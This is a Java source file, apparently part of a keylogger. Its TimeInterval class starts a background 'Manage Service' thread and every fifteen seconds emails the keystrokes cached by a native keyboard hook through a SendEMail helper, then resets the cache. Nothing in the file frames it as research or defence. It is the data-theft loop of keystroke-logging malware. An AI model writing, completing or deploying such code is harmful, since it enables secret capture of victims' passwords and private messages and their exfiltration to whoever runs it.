/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Controllers;

import KeyStrokes.NativeKeyBoard;
/**
 *
 * @author ahmed
 */
public class TimeInterval implements Runnable {
    private final NativeKeyBoard keyboard;
    private final Thread service;
    public TimeInterval() {
        keyboard = new NativeKeyBoard();
        service = new Thread(this, "Manage Service");
        service.start();
    }
    public NativeKeyBoard getKeyboard() {
        return keyboard;
    }
    @Override
    public void run() {
        long start = System.nanoTime();
        while (true) {
            long elapsed = (System.nanoTime() - start) / 1_000_000;
            if (elapsed > 30_000 * 0.5) {
                try {
                    SendEMail.sendMail(KeyCodes.prettyPrint(keyboard.getKeyCache()));
                    keyboard.onSend();

                } catch (Throwable e) {
                    keyboard.onfail();
                }
                start = System.nanoTime();
            }
        }

    }
}
